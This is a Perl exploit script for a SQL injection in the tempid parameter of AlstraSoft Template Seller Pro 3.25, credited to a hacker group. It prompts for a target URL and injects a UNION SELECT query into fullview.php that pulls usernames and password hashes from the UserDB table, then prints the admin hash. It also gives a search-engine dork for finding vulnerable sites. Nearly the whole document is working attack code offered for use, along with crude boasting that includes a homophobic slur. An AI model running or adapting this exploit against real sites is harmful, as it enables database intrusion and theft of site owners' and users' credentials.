#!/usr/bin/perl -w

# Template Seller Pro 3.25 (tempid) Remote SQL Injection Vulnerability
# Author	: v3n0m
# Contact	: v3n0m666[at]live[dot]com
# Site		: http://yogyacarderlink.web.id/
# Group		: YOGYACARDERLINK
# Date		: April, 23-2010 GMT +7:00 Jakarta, Indonesia
# Software	: AlstraSoft Template Seller Pro
# Version	: 3.25 Other versions may also be affected
# Price		: $260 USD
# Vendor	: http://www.alstrasoft.com/
# Greetz	: All Yogyacarderlink & devilzc0de Crews
# Thx		: c4uR (lo emang hacker martabak banget ur, gw salute!!)
# ShoutZ	: elicha Cristia [ take care you there honey :) ]
sub clear{
system(($^O eq 'MSWin32') ? 'cls' : 'clear'); }
clear();
print "|----------------------------------------------------|\n";
print "|   'Template Seller Pro 3.25 Remote SQL Injector'   |\n";
print "| Coded by : v3n0m                                   |\n";
print "| Greetz   : Yogyacarderlink Crew                    |\n";
print "| Dork     : allinurl:fullview.php?tempid=           |\n";
print "|                                                    |\n";
print "|                         www.yogyacarderlink.web.id |\n";
print "|                                                    |\n";
print "|--------------------------------------[ elicha ]----|\n";
use LWP::UserAgent;
print "\nInsert Target:[http://wwww.target.com/path/]: ";
chomp(my $target=<STDIN>);
print "\n[!] Exploiting Progress...\n";
print "\n";
#Nama Column
$elicha="group_concat(user_name,char(58),user_password)v3n0m";
#Nama Table
$table="UserDB";
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$host = $target . "fullview.php?tempid=-9999+union+all+select+1,".$elicha."3,4,5,6,7+from/**/".$table."+--+";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-fA-F]{32})/){
print "\n[+] Admin Hash : $1\n";
print "[+] Success !! Check target for details...\n";
print "\n";
print "Attention:\n";
print "v3n0m emang paling ganteng se-jabotabek\n";
print "Yang kaga setuju/protes = GAY !!\n";
print "\n";
}
else{print "\n[-] wah gagal bro (Belom Cebok tangan lo)...\n";
}